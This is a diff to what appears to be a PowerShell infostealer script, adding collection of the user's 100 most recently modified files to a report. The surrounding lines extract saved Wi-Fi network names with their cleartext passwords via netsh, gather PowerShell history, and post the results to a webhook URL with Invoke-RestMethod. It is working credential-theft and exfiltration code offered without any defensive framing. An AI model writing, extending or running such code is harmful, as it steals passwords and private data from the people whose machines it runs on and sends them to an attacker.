@@ -344,6 +344,7 @@ $outpath = "$env:temp\systeminfo.txt"
 $outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
 if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 
 $infomessage = "``========================================================
 
@@ -379,6 +380,8 @@ $systemString``"
 ($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($RecentFiles | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
